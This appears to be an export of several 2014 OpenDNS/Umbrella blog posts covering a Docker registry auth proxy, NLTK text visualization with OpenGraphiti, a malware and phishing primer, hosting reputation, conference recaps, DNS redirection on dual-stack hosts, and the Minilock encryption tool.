hello-world\n172.17.0.41\nubuntu@trusty-64:/nginx-auth-proxy# docker run -d -e AUTH_BACKEND=http://172.17.0.40:8000 -e BACKEND=http://172.17.0.41:8081 -p 0.0.0.0:8080:80 nginx-auth\nubuntu@trusty-64:/nginx-auth-proxy# curl 0.0.0.0:8080\n<html>\n<head><title>401 Authorization Required</title></head>\n<body bgcolor=\"white\">\n<center><h1>401 Authorization Required</h1></center>\n<hr><center>nginx/1.6.1</center>\n</body>\n</html>\nubuntu@trusty-64:/nginx-auth-proxy# curl -u testuser:testpassword 0.0.0.0:8080\nHello world\nThe only thing left to add to these containers are SSL certificates and you’re good to go! You can find the code for the Nginx authentication proxy here and the container available here. A few things to note with this solution:\nusing basic auth means that every request will hit the authentication API\nbasic auth means your credentials will be sent in the clear unless you secure your connection with SSL. NOTE: never send basic auth credentials without SSL!!! Also, Docker’s client & registry doesn’t like basic auth over HTTP.\naccess to the private registry will need to be restricted to the authentication proxy\nAnother interesting side effect of this solution is that enabling SSL on the private registry has reduced the amount of time it takes for each pull request as the client initially attempts to connect to port 443 before falling back to port 80 unless the port is specified in the registry URL.', 'Docker;Security Engineering', 'https://umbrella.cisco.com/blog/2014/09/03/docker-private-registry-authentication/');

They’re all alike.\nYou may have recognized the opening lines of this now legendary text. The Hacker’s Manifesto, first published in Phrack #7 in 1986, was written by “The Mentor” shortly after his arrest. It is now part of the common hacker knowledge and stays a monument of the cyber culture. Today, we would like to give it a new lease on life using OpenGraphiti, our data visualization engine.\nIn this article, we will present you a way to do some text analysis with OpenGraphiti combined with NLTK, the Natural Language Toolkit. First let’s have a quick look at what NLTK is and does :\nNLTK is a leading platform for building Python programs to work with human language data. It provides easy-to-use interfaces to over 50 corpora and lexical resources such as WordNet, along with a suite of text processing libraries for classification, tokenization, stemming, tagging, parsing, and semantic reasoning, and an active discussion forum. NTLK is a leading platform for building Python.\n(Source : http://www.nltk.org)\nIn other words, NTLK is a text processor for human languages such as English, Spanish, French, Chinese … We will use it to parse our Hacker’s Manifesto and analyze the output with OpenGraphiti. This will bring a new light on the structure of that text and the way NLTK parses words and sentences in a unique and visual way. Obviously, this technique can be very well applied to any other text, our use case here only serves as an example.\n\nParsing the text with NLTK\nNow we will assume that you have NLTK installed on your machine and that you have a file called “manifesto.txt” containing the text to process. The relevant Python code to parse your text data looks like this :\ndata = list()\n    with open(\"manifesto.txt\", \"rU\") as infile:\n\n        text = infile.read()\n        print(\"Parsing sentences and tagging words with NLTK ...\")\n        sentences = nltk.sent_tokenize(text)\n\n        for sentence in sentences:\n            tokens = nltk.word_tokenize(sentence)\n            tagged = nltk.pos_tag(tokens)\n            data.append(tagged)\n\n        print(tagged)\nFairly straightforward indeed :\nOpen the file, read it.\nCut the text into sentences\nForeach sentence, cut it into words\nTag the words with an NLTK type\nPrint the result\nIn order to illustrate NLTK’s mechanism, let’s just focus on this sentence :\nHave you ever looked behind the eyes of the hacker ? Did you ever wonder what made him tick, what forces shaped him, what may have molded him ?\nFor that specific sentence, here is what NLTK would give us :\n[(\'Have\', \'NNP\'), (\'you\', \'PRP\'), (\'ever\', \'RB\'), (\'looked\', \'VBN\'), (\'behind\', \'IN\'), (\'the\', \'DT\'), (\'eyes\', \'NNS\'), (\'of\', \'IN\'), (\'the\', \'DT\'), (\'hacker\', \'NN\'), (\'?\', \'.\')]\n\n    [(\'Did\', \'NNP\'), (\'you\', \'PRP\'), (\'ever\', \'RB\'), (\'wonder\', \'JJR\'), (\'what\', \'WP\'), (\'made\', \'VBN\'), (\'him\', \'PRP\'), (\'tick\', \'VBP\'), (\',\', \',\'), (\'what\', \'WP\'), (\'forces\', \'NNS\'), (\'shaped\', \'VBD\'), (\'him\', \'PRP\'), (\',\', \',\'), (\'what\', \'WP\'), (\'may\', \'MD\'), (\'have\', \'VB\'), (\'molded\', \'VBN\'), (\'him\', \'PRP\'), (\'?\', \'.\')]\nAs you can see, the whole text has been cut into sentences. Those sentences are represented by arrays of words. Each word is represented by a pair of elements. The first one is the word, the second is the NLTK type. Now how do we know what they mean ? Well, NLTK provides a very simple way to read the documentation about those types. For example, let’s focus on the tag associated with the word “looked” in the first sentence. (VBN)\n$ python\n    >>> import nltk\n    >>> nltk.help.upenn_tagset(\'VBN\')\n    VBN: verb, past participle\n        multihulled dilapidated aerosolized chaired languished panelized used\n        experimented flourished imitated reunifed factored condensed sheared\n        unsettled primed dubbed desired ...\nFair enough! NLTK gives us a code to communicate the type/function of a word in a sentence. Now all we have to do is use SemanticNet to transform our tagged tokens into a nice graph.\n\nBuild the graph\nThe process is fairly simple, we will just parse all the sentences and create a connected path between the succession of words in the sentence. If a word or edge has already been created, we don’t recreate it. If we apply this on the whole text, this will give us a graph of words connected when they appear next to eacher in the text. And finally we can type them with the NLTK tag.\nExample :\n“NLTK is amazing. OpenGraphiti is great too.”\nThis will be parsed and tagged like this :\n[(u\'NLTK\', \'NN\'), (u\'is\', \'VBZ\'), (u\'amazing\', \'VBG\'), (u\'.\', \'.\')]\n    [(u\'OpenGraphiti\', \'NNP\'), (u\'is\', \'VBZ\'), (u\'great\', \'JJ\'), (u\'too\', \'RB\'), (u\'.\', \'.\')]\nWe can then create a graph defined as follows :\nNodes : NLTK, is, amazing, ., OpenGraphiti, great, too\n    Edges :\n        NLTK --> is,\n        is --> amazing,\n        amazing --> .,\n        OpenGraphiti --> is,\n        is --> great,\n        great --> too,\n        too --> .\nLet’s take a look at our creation algorithm using SemanticNet to perform that task.\nimport semanticnet as sn\n\n    graph = sn.DiGraph()\n\n    for sentence in data:\n\n        previous = None\n        for token in sentence:\n\n            word = token[0].lower()\n            type = token[1]\n\n            if not graph.has_node(token[0]):\n                current = graph.add_node({ \"label\" : word, \"type\" : type}, word)\n            else:\n                current = word\n\n            if previous is not None:\n                edges = graph.get_edges_between(previous, current)\n                if not edges:\n                    graph.add_edge(previous, current)\n\n            previous = current\n\n    graph.save_json(\"manifesto.json\")\nNotes\nWe use the lower() method to transform everything in lowercase. (OpenGraphiti and opengraphiti would be treated equally)\nWe don’t make the distinction between different types on the same word. We keep whichever appears first.\nGoing further\nWe could spice things up a little bit. For instance, we could count the number of occurrences of each edge. That would give us a Markov graph of all the word transitions. That can also be visualized.\nAnother idea is to create a timeline to play the text over time and simulate it as if it was spoken in realtime!\n\nVisualization\nOnce our SemanticNet graph has been created, we can visualize it with the OpenGraphiti engine :\n$ ./graphiti demo manifesto.json\nWe can now contemplate the result in three dimensions! We captured a video of the engine in action and we are happy to share it with you. This video first shows you the resulting graph created with the technique described above, and then plays the text over time.\n\nWe hope you enjoyed this tutorial. This use case hilights an interactive way to dig into the NLTK parser mechanism. It could very well be applied to other language parsers or text processors. It is only a simple use case to expose how we can explore complex semantic data with a little bit of Python and the OpenGraphiti framework!\n\nReferences\nOpenGraphiti project : http://www.opengraphiti.com\nThe Hacker’s Manifesto : http://phrack.org/issues/7/3.html\nMarkov Chain on Wikipedia : http://en.wikipedia.org/wiki/Markov_chain', 'Open Source;Security Research', 'https://umbrella.cisco.com/blog/2014/08/28/hackers-manifesto-revisited/');

With so many different names and kinds of threats, it can be daunting to keep track of all the different ways that a computer can be compromised. OpenDNS and our Umbrella Roaming Client are powerful security tools, but the best weapon in the fight against cybercrime is battlefield knowledge.\nSome might call the comparison of malicious activity to warfare a little hyperbolic. Not long ago, bugs and viruses were the realm of bucktoothed hackers looking to annoy people or companies, but weren’t treated as anything other than irritating teenagers with an internet connection, a computer, and some time to kill. But times have changed, and malicious activity on the net isn’t a joke anymore, but a business. According to McAfee, malicious activity annually costs the world about $375 billion, at a conservative estimate. The FBI tells us that 18 computers get infected every second. OpenDNS’ security solutions help prevent malware and phishing attacks from affecting your computers, but knowing about the different threats is key.\nMalware refers to any piece of malicious software, programs that are designed to impede or disrupt a computer’s standard operations. Previously, this was used mainly to refer to viruses, but as malware becomes more of an industry than a hobby, we see new variants emerging—including keyloggers, ransomware, and RATs. These threats vary in terms of what they do and the kind of damage they inflict, so I’ll go over them one by one.\nKeyloggers are programs that run invisibly on your computer in the background. While running, keyloggers record all of your computer’s keystrokes and send them to the attacker. Though the attacker may get your benign search terms (I’ve searched for “cats” more times than I’d care to admit), they’ll also get your passwords and email addresses if you type them in. Because the keylogger is on your computer, those keystrokes are unencrypted and totally exposed to the program. Keyloggers can just as easily record your PIN or credit card information when using online shopping services or banking.\nWhereas keyloggers hide in the background, ransomware is anything but subtle. These programs take your computer files such as the photos from your last vacation, tax records for your business, or your favorite songs from this really rare album you have, and encrypts them, making them unable to be opened by you until a fee (the “ransom”) is paid. Some even offer technical support in helping you pay them. One famous example of this software is Cryptolocker, which earned its operators $30 million in 100 days.\nRounding out the list, RATs are what a lot of people think of when they imagine cybercrime. An acronym standing for Remote Access Trojan, these programs give root access of a computer to the attacker, letting them remotely control all of the computer’s functions. They can move your cursor, see what windows you’re currently looking at, and much, much more. Having full access to your computer means they can do anything and everything they want with it.\nWhereas malware is designed more to take advantage of your computer and its weaknesses, phishing attacks are designed to take advantage of you. A play on fishing, this sort of malicious behavior is meant to trick you into revealing sensitive or valuable information, such as your passwords, bank account number, SSN, or any other information you want to keep secret. One of the major differences between phishing and malware is that very few phishing attacks require you to download anything.\nNigerian Scamming Emails, alternatively called “419 attacks” (from the Nigerian Criminal Code about fraud) or “Nigerian Prince Emails” are famous examples of phishing attacks. In these emails, the senders claim that they have a large amount of money held in trust because a wealthy relative died, and that they need a little bit more money to gain access to the larger sum. Perhaps they can’t afford the trip to the bank in the capital to claim it, or they may need to pay a “service fee” to the bank. However, this bank, and the larger sum, don’t actually exist. It doesn’t stop people from believing that if they wire some money to the sender, they’ll receive a payout at the end.\nSimilarly, there are many messages purporting to be from banks or email services like Google. In it, the sender warns that the victim’s account is in jeopardy. Maybe the account is about to be deleted, or that it has been compromised. In any case, the sender has to “authenticate” that the victim is legitimate, and so requests the victim’s account information, including any passwords and mailing addresses. Email phishing attacks are very common because it’s email is cheap, fast, and easily spoofable; it’s trivial to claim a sending email address as “accounts@bankofamerica.com” or “customerservice@google.com” but receive the message elsewhere.\nTo learn more about phishing check out this talk “Teach a man to phish” from fellow OpenDNSer Vinny Lariza, who recently presented at BsidesLV.\nLearning about the different threats on the web is the best weapon in any person’s arsenal, but knowledge alone isn’t enough. Even the most careful people on the web still fall prey to attacks, which is why OpenDNS is here to help defend computers and their users.', 'Security 101', 'https://umbrella.cisco.com/blog/2014/08/21/phish-sea/');

Often times, when people begin the process of setting up a website or server (a.k.a. property), little\nresearch is done into exactly where they will be hosted at, who they are registering the domain name through, other sites nearby, and other subtle variables – such as a dedicated or shared server. Many decide to go with the inexpensive hosting provider to save costs, choose an inexpensive domain registrar, and use default packages to get their site rolling, all with little regard on the area they will be residing in. This is much like buying or renting a home with little or no insight into the neighborhood you are about to move into.\nWhile usually this can work out with little problem, one can end up moving into a less than reputable area of the Internet. The result can have a negative valuation on your site in many ways, from SEO to unexpectedly being put onto a blacklist due to who you share space with.\nMuch like metropolitan areas throughout the world, the Internet has it’s own rough parts of town. These can include hosting providers who care more about money then their reputation, registrars who do not fully follow the rules set forth by ICANN’s Registrar Accreditation Agreement (RAA), domains that have been compromised without the owners knowledge and are being used for malicious purposes, or, on the flip side of that, known malicious domains hosting nefarious content by the owner for the purpose of infecting visitors computers for various reasons. All of these can affect you or your company’s presence on the web in different ways, and usually not for the better.\nHow does it all connect together?\nOn the outset, your domain name is resolved to a Internet Protocol (IP) address through the use of the Domain Name System (DNS). Without this, you would have to remember a string of numbers every time you wanted to visit a site, and those numbers don’t always stay the same, adding some complication to the process. This usually is not a problem for bigger companies that pay for a dedicated IP, but for smaller budgets, this is not always an option.\nIP addresses that send spam, host malware, or are Command and Control (C&C) servers for botnets can end up on so called blacklists. When this happens any information sent from them will no longer make it to the intended target and will likely be inaccessible by inbound traffic. This is usually done for the greater good of the users of the Internet, but can be bad if your IP address ends up on one of these lists, even though you have not done anything wrong yourself. Getting your product to customers or message across to readers can become next to impossible if they can not get to you.\nAll of these IP addresses are a subset of a bigger sphere called the Autonomous System (AS). These AS’ are a set of routes that are distributed among network operators so that every computer can talk to every other computer that is reachable on the Internet. Above the AS’ come Autonomous System Networks (ASNs) that are run by ISPs and are registered officially and identify each network on the Internet. These AS’ represent the city in which you are going to live in. For a more detailed breakdown of what an AS is, you can read this OpenDNS whitepaper here.\nWhy does it matter?\nMuch like any city, there is always some extent of crime going on. Obtaining an IP address is essentially nothing more than then moving into a region of a city. Depending on the neighborhood, the value of your property will go up or down given what is going on around it. Bad neighbors can greatly cause the value of your property to go down. This is where a little research can go a long way in deciding if you will be affected by SEO page rankings, potential for compromise, getting blacklisted due to someone hosting malicious software on the same server/IP as you, getting a reused IP that once was considered to be dangerous and blocked by numerous companies, and more.\nWho can help me?\nAttempting to figure this out all on your own can turn into quite the daunting task. Luckily, I’m here to help you. In my next blog post I will show how some of the powerful tools we use here at OpenDNS can make this task much easier by narrowing down some of the more unruly parts of the web using both Investigate, and our newly released open-source visualization tool, OpenGraphiti.', 'Malware;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/08/21/websites-and-bad-neighbors/');

Customer feedback is our primary measure of success, but we also get excited when a glowing and thorough review of our service is published. Moreover, when the review of OpenDNS Umbrella is from SC Magazine, a highly respected information security publication, we get really excited.\nToday, I am very proud to highlight this new review written by Technology Editor Peter Stephenson and published in this month’s issue of SC Magazine. What makes this review special is that it not only provides insight into the changing nature of network security as a category, but it also highlights how the hackers here at OpenDNS have built something unique, sophisticated and differentiated. I highly recommend that you read the review yourself to get his insights first-hand.\nAs a seasoned enterprise security reporter, product reviewer and security practitioner, Peter has had a unique perspective on the industry. That’s why I was particularly struck by Peter’s succinct explanation of one of OpenDNS great differentiators: the security intelligence we provide to our customers.\n“The idea behind Umbrella is that all of the devices in the enterprises point to the OpenDNS name servers. These servers are managed for security, gather extensive intelligence about reputation and mix the whole thing together in a complete network security offering.”\nThis passage also highlights how OpenDNS’s rich history has led to our continued success. Umbrella effectively marries the protection of a cloud-delivered enterprise network security service with predictive intelligence gained from the over 50 billion queries daily that OpenDNS powers. The combination of these two technologies enables OpenDNS to protect customers from threats before they are even attacked. That protection follows them anywhere they go, on any device that they use.\nWe continually see the industry take note of how far we’ve come as an enterprise security company, and this review is no exception. Whether it is Gartner calling us out as a Cool Vendor or being named the top vendor in the 2013 Security Startup “Red List” Survey, it is humbling to see the exceptional work produced by the team at OpenDNS being recognized by the industry at large.\nSC Magazine’s review reinforces the fact that OpenDNS is continuing to evolve and provide incredible value for our customers every single day.

I also held two roles at Facebook as a Database Engineer and Systems Engineer.\nJoining the database team at RightNow was where I picked up a passion for systems automation, database design, and systems engineering. This also coincided with my master thesis research at Montana State.  I started to focus all my energy into big data, which led me to take on a role at Facebook as a Database Engineer.\nAt Facebook, I was privileged to take part in building one of the largest real-time database infrastructures in the world. I worked on a multitude of projects, but the highlights for my tenure were related to being a core engineer for the MySQL Pool Scanner Project and building out the database infrastructure for the Timeline feature. Working on systems at Facebook allowed me to continue my interests in hardware and software automation.\nTowards the end of my career at Facebook, I started to renew my interest in systems security while working on my on-line radio station, ETN.fm. I was always fascinated by software security growing up, especially growing up with cult classics like Matrix, Hackers and Real Genius. Without much effort at all, it was apparent that OpenDNS was in the forefront of Enterprise Security Research, and I immediately utilized the product on all hosts for ETN.fm. I visited with OpenDNS engineers and spent time with members of the company and was immediately excited. I saw an opportunity to help construct an infrastructure platform that allows OpenDNS engineers and research teams to do what they do best; securing any device, anywhere anytime. I happily accepted a role as a Systems Engineer within Infrastructure Engineering.\nOne of the things I noticed within OpenDNS is the excitement people have coming to work everyday. I asked some of my new peers why they also joined the team and here are some of the responses I received;\n“I met a few people at meet up about Docker at OpenDNS Vancouver location. They explained some of the technologies they were using and the projects they were working. Not only the work they were doing was interesting and challenging, but everyone seemed really excited to be part of it. That was enough reason for me to want to join OpenDNS. I’ve been here for about 3 weeks now, and it’s been #awesome. There is a lot of stuff to learn and interesting challenges to tackle which makes work quite fun. The work environment is amazing and everything is provided to do your work at the highest level. In summary, if you are not part of this #awesome team, then you should ask yourself what I am waiting for.”\n — Hesam Ghasemi, Site Reliability Engineer – Infrastructure Engineering\n“I am passionate about connecting people. When I was first contacted by OpenDNS, I was thrilled. I loved the idea of helping people connect and at the same time providing them with an easy and simple way to protect their Internet access, which was always a challenge throughout the environments I have worked on before. Through the interview process I caught a glimpse of the amazing people I would be working with and was awed by the technical atmosphere that was laid out in front of me. Working on a global network serving millions of users every day is certainly fascinating. I was ultimately hooked when I read about the core values and the workplace environment. It sounded like a perfect match and I couldn’t help but say “I’m in!”\n— Alvaro Pereira, Network Engineer – Infrastructure Engineering\n“I’ve worked in a lot of small shops, and most of that time was spent on my own.

I kept swearing that my next job would have actual *coworkers*. And turns out not only does OpenDNS have coworkers, they’re smart, funny, and generous people.\nThat’s the change part; the challenge comes with the scale. I’ve gone from taking care of one server room to working with data centres in 23 cities around the world. Working with some of the newest technologies to make things work for customers, and inventing some of our own. From routing challenges in Docker to correlating ASN activity, there are a *lot* of things that become possible at this scale that I simply never would have encountered anywhere else.

I felt like I pretty much knew what to expect. This time was slightly different, however. For one, I was no longer be in my backyard. This time I was in in sparkly Las Vegas, Nevada, the “Miracle in the Desert”, where the “Sky’s the Limit.” I also presented a thirty-minute talk about phishing sites, which was something that I’d never done before.\nWas I nervous? Sure. Public speaking is high on the list of people’s biggest fears – and I am one of those people. But not for nothing, I have always appreciated the BSides events for their welcoming vibe and positive demeanor. It seemed like a fitting place to cut my teeth.\nNeedless to say, the talk – How To Punch a Phisher in the Face! (video) – went over quite well with the audience, who were chiming in towards the end with their own anecdotes as well as including their own solutions to how they prevent themselves from phishing attacks.\nSpeaking at BsidesLV was a great experience and I would encourage anyone involved in or with technology to participate.\n\nBSides Las Vegas – Adrienne Merrick-Tagore\n\nI’m a relative n00b to security conferences. In the last year, I’ve been to Black Hat, RSA, and Bsides San Francisco.  This was my first time presenting in front of a security audience. My talk centered on my experience interacting with the OpenDNS Security Graph API, from the perspective as a fairly non-technical marketer. I opened by taking a photo of the audience, and then dove into my journey learning how to interact with the API.\nI wanted to accomplish two things. At a technical level, I wanted to see what OpenDNS’s customers’ experience would be when they interact with our API. I wanted to put myself in their shoes, to learn how to use our product and its API.\nAt a personal level, I wanted to dust off my Python knowledge and apply it to something relevant in my real life, and to inspire others to take the plunge into hack away at something new.\nThis was a nerve-wracking, rewarding, fun experience! I faced my fear of public speaking by presenting in front of about 30 people. I learned something new that was personally fulfilling and that will also make me better at my job. In the process, I met some really cool people, some of whom are now inspired to learn Python or another programming language. And now I’m hooked – I want to do it again!\nThe recording of my  talk can be found here: Can I Code Against an API to Learn a Product? (video)\n\nBlack Hat 2014 – Andrew Hay\n\nI have attended Black Hat for a number of years but 2014 marks the first time I’ve been accepted to present. Thibault Reuille and I presented our talk entitled Unveiling The Open Source Visualization Engine For Busy Hackers, which served as a launch pad for OpenGraphiti – our free and open source data visualization engine.\nHow’d we do? Based on the applause, the laughing at our jokes, and the audience engagement during the talk (not to mention the continuous flood of questions at our booth on the show floor before and after the presentation) we believe that the session was a complete success! We were told the room held ~603 people and, based on a very rough count, I estimate that between 550 and 575 people attended – that’s >90% capacity for those of you counting along at home.\nWe also had the opportunity to brief several people including a podcast-style interview with DarkReading and several reporters from Forbes, Wired, and other well respected technology news outlets.\nThibault and I also provided a very informal (if not ad hoc) Q&A session at the booth adjacent to the OpenDNS booth. At the table, we were able to sit down with existing OpenDNS customers, data scientists, security analysts, and other interested parties who had specific questions about OpenGraphiti, Investigate, and Umbrella.\nThibault and I weren’t the sole OpenDNS representatives accepted to speak at Black Hat, however. Dhia Mahjoub and Andree Toonk joined Thibault at Black Hat to present Catching Malware En Masse: DNS and IP Style. (Note: Thibault will talk about this more in his DEFCON wrap up section as the talk was also presented there.)\n\nDEFCON 22 – Thibault Reuille\n\nWhat a great pleasure and honor to finally step foot in the legendary DEFCON ! It was a first for me and also for some of my partners in crime. Several OpenDNS folks attended DEFCON including (from right to left) Anthony Kasza, Dhia Majhoub, Andree Toonk, and myself.\n\nI had a feeling that DEFCON wouldn’t disappoint, and it certainly didn’t! We were presenting our research in front of a very responsive crowd. Indeed, we had interesting content as Dhia was presenting discoveries and detection models to catch malware IP & DNS style, Andree offered his networking expertise and vision on monitoring the large ASN network and its BGP routing tables, and finally I did my best to illustrate our talk with interactive 3D visuals create with OpenGraphiti. Our talk was very well received and several times during the talk people stood up and started clapping. It definitely meant a lot to us.\nA couple of minutes into the talk, the DEFCON “Goons” played a joke on us. They interrupted our presentation to have us drink a shot of Whisky. In fact, we learned this is a tradition for the first time speakers at DEFCON. Good times.\n\n\nOther than that, it’s pretty hard to describe the DEFCON spirit other than saying that “it’s fairly unique”. The vendors were selling trendy security hardware as SomaFM played soft lounge music in the chill out room with beautiful animated visuals. The various villages presented interesting talks over a wide variety of topics (Cryptography, Wireless, Social Engineering …) while the impressive CTF contest took place with participants from all over the world. Last but not least, the Wall of Sheep! One of the rooms had a large screen showing the results of a password sniffer running on the open DEFCON network. If you were on that board, I’m sorry for your account.\n\nLeaving Las Vegas\n\nThe entire OpenDNS team had a blast in Las Vegas. Sharing knowledge, answering questions, and engaging in deeply technical conversations are what make security conferences great. We will definitely be back at Black Hat in 2015 and I suspect we will have far more research to present at the Black Hat, BSides Las Vegas, and DEFCON conferences as the team continues to shine a light on the darker parts of the Internet.\nUntil next time!', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2014/08/14/las-vegas-presentation-recap/');

In this post I’ll be showing a few issue that arise for dual-stacked hosts (meaning the host has both IPv4 and IPv6 addresses) when they’re using a DNS provider that redirects NXDOMAIN, NODATA and SERVFAIL responses. If you need a quick refresh on NXDOMAIN vs NODATA, see my previous post.\nDNS redirection is the act of a recursive resolver intercepting NXDOMAIN, NODATA and SERVFAIL responses from an authoritative server and serving up an alternative IP address. This effectively tricks the requesting application into thinking there is an actual host at that name. This technique is commonly used by ISPs or DNS providers as a means of serving assisted search pages for mistyped domains, redirecting clients to advertising pages/resources, or for collecting statistics (see DNS Hijacking for more details). For the most part, on a typical IPv4 enabled host, DNS redirection isn’t a problem (although it may complicate some special DNS applications), but a real issue begins to arise when dual-stack (both IPv4 and IPv6 enabled) clients encounter DNS redirection.\nI’ve previously written about how different operating systems resolve hostnames when they are dual-stacked here, so for now I’m only going to focus on OSX 10.9 (but know that this problem will affect most OSes). When you have a dual-stacked OSX host, and an application that is using the system resolving libraries (the system call getaddrinfo() specifically), OSX will send out both A (IPv4) and AAAA (IPv6) requests. Here’s an example of my dual-stacked host trying to lookup the local donut shop’s domain:\n# tcpdump -n -s 1500 -i en0 udp port 53 & ./getaddrinfo www.timhortons.com\r\n 10.10.10.165.63835 > 208.67.222.222: 18223+ A? www.timhortons.com.\r\n 10.10.10.165.55987 > 208.67.222.222: 9571+ AAAA? www.timhortons.com.\r\n 208.67.222.222 > 10.10.10.165.63835: 18223 1/0/0 A 206.152.12.196\r\n 208.67.222.222 > 10.10.10.165.55987: 9571 0/1/0\nFrom the tcpdump we can see that A and AAAA requests were sent out in parallel. Our A record request received “206.152.12.196” and our AAAA record request recieved a NODATA response. Now let’s imagine we were using a DNS provider that was doing DNS redirection. The AAAA NODATA response from our donut shop’s authoritative DNS server would have been redirected and we would have been served a valid IPv6 address (hopefully with some donut-related advertising). At this point both the A and AAAA records would be given to the calling application and it would be up the applications logic to choose which record to use (but the application has no way of knowing that the AAAA record has been falsified). This can (and will) lead to a very confusing browsing experience, the falsified record may take you to a webpage claiming the domain you’re looking for doesn’t exist!\n“Can’t the DNS provider’s recursive resolver just look to see if both records types (the IPv4 and IPv6) are NXDOMAIN, NODATA or SERVFAIL before deciding to redirect an answer?”\nAt first glance it might look as though recursive DNS providers can work around this problem by checking both record types before responding, but another issues arises for DNS redirection when you include a search domain in your systems resolv.conf. Let’s assume for the purpose of this example you’ve added “dunkindonuts.com” and “opendns.com” to your list of DNS search domains so that you only have to type “system” when looking up “system.opendns.com” (knowing that there is no “system.dunkindonuts.com” host). Now let’s look at what the system’s resolving libraries will do:\n# tcpdump -n -s 1500 -i en0 udp port 53 & ./getaddrinfo system\r\n 10.10.10.165.50227 > 208.67.222.222.53: 5591+ A? system.dunkindonuts.com.\r\n 208.67.222.222.53 > 10.10.10.165.50227: 5591 NXDomain 0/1/0\r\n 10.10.10.165.54555 > 208.67.222.222.53: 48108+ A? system.opendns.com.\r\n 208.67.222.222.53 > 10.10.10.165.54555: 48108 1/0/0 A 208.69.38.170\nThe system resolving libraries have done a lookup for “system.dunkindonuts.com”, waited for the responses (which was an NXDOMAIN), and then tried a lookup of “system.opendns.com”. The result is that we get the correct response for “system.opendns.com”. Now if this query had been done against a server which was doing DNS redirection our initial NXDOMAIN response (meaning there were neither IPv4 or IPv6 records) from the “system.dunkindonuts.com” query would have been redirected and replaced with a falsified record and the OS would have stopped trying to resolve the correct host.\n“Doesn’t OpenDNS use DNS redirection to display ads? Isn’t that your entire business model?”\nIt is true that previously OpenDNS did use DNS redirection for the purpose of giving what we called “a guide page”, but we don’t do that anymore. OpenDNS has transitioned away from advertising-based revenue to focus on our world class enterprise security platform. You can read more about our transition away from ads in our CEO’s blog post “No more ads”.\nSo now that you know more about the pitfalls of DNS redirection, don’t put up with a recursive DNS server that redirects your traffic, especially not in the coming dual-stacked world.', 'DNS;Security Engineering', 'https://umbrella.cisco.com/blog/2014/08/12/dns-hijacking-dual-stacked-hosts-donut-shops/');

We have been using this tool extensively to provide new insights into, and unique perspectives of, our intelligence database. The project has now reached a certain level of maturity and we are extremely proud to announce OpenGraphiti!\nSo, what is it ?\nOpenGraphiti is a new data visualization engine focused on 3D rendering. It can visualize any relational data by connecting various entities with ‘like’ relationships. In addition to the visualization tool, we also provide all of the required tools and libraries to create your own custom datasets. The engine exposes an API, written in C, with wrappers for Python and Javascript. Any data scientist with basic skills in Python can add visualizations to their framework and connect it with their favorite data analysis tools. The API offers the possibility to directly play with the visual representation of the data – making it easier to explore, analyze, and present complex data to a visually inclined audience.\nHow does it work ?\nWhen it comes to data visualization, there are multiple approaches to the problem. As the main purpose of the engine is to analyze the topology of any relational dataset, we need to gravitate towards visualization techniques that will let the data drive the layout – and not the other way around. For that kind of visualization, the de facto standard tends to be the use of force-directed layouts.\nThe general concept is relatively simple in that every node is treated as a particle and every edge as a force on the particles. By implementing an engine capable of running a particle physics model we can transform relational data, however loosely related, into a 2D or 3D structure – completely defined by the shape of the relational structure. This relational structure serves to highlight hidden clusters or topological patterns that may have previously gone unnoticed\nOpenGraphiti is written in C/C++ and takes full advantage of the GPU power using technologies such as OpenGL, GLSL shaders and OpenCL parallel programming library. Most of the geometrical math is calculated with the GLM math library and the python scripts leverage the amazing NetworkX graph library. The project can be compiled with CLang++ for a native binary (Best performances) but also with LLVM compilers like Emscripten to create a Javascript bytecode that can be easily integrated in a web page.\nMost data visualization tools suffer from latency or performance issues when dealing with large datasets. Our goal is to significantly push the limits by using modern acceleration and parallelization techniques. Everybody can appreciate the evolution of 3D graphic cards just by looking at the last video games : Indeed several hardware companies have invested a lot of efforts in improving the quality and performance of their GPUs and they have become insanely good at 3D rendering. Then why not apply it to data visualization?\nWhere can I get it ?\nDon’t miss our official release at BlackHat! This will be the chance to discover OpenGraphiti and ask any questions you may have. Andrew Hay and I (Thibault Reuille) will be presenting on August 6th 2014 in the Jasmine Ballroom from 14:15-15:15 (2:15pm to 3:15pm).

PGP also made it possible for anybody to digitally sign files and emails before sharing them, so that the recipients can verify their authenticity.\nFollowing the specification, the alternative implementation GnuPG was written, and support for PGP was made available for many email clients.\nPGP implementations are still actively maintained, and there are no known practical attacks against data encrypted using them.\nSo, why isn’t everybody using PGP?\nThe main issue with PGP is not security, but usability. The available tools are complex to use, and even people using them on a daily basis admit not knowing more than 10% of their features.\nAnother issue is that unlike 23 years ago, most of our time is now spent in a web browser, and on many devices. Having to install and configure a desktop application on every computer is painful. It should be simple and easy to encrypt and decrypt files on any device, anywhere.\nThe End-to-end Chrome extension is a huge step towards making PGP easy to use, right in a web browser. However, it is definitely not ready for primetime yet.\nIntroducing Minilock\nMinilock is another project we are really excited about, and the first stable version was just made available as a Chrome extension.\nMinilock doesn’t try to be compatible with PGP. However, it was designed from the ground up to be as easy to use as possible.\nAs a Chrome application, it couldn’t be any easier to install, and it will be instantaneously\navailable on all compatible devices running the browser with the same identity.\nBy design, no configuration is stored anywhere. When the application starts, it asks for an email address and a password. This combination is all it takes to start encrypting and decrypting files. Files encrypted with a given (email, password) pair can be decrypted on any device just by typing the same (email, password) pair.\n\nPlease note that the email doesn’t have to be a real address. This email is just combined with the password in order to generate the actual encryption key. It makes sure that two users with the same password will not end up with the same key.\nIn order to encrypt a file, drag-and-drop it to the Minilock window. The encrypted file can then be saved locally. To decrypt a file, the operation is exactly the same.\n\nThe “Minilock ID” is what other people have to use in order to encrypt a file specifically for you. It is a short string, that doesn’t reveal any information about your actual email and password, and that can be safely shared publicly.\nMinilock doesn’t have any other features. Simplicity is its strength. And even if cryptographic applications in a web browser remains a controversial topic, we can only support this remarkable effort to build a privacy tool that anybody can use.\nPhoto Credit: Yuri Yu.

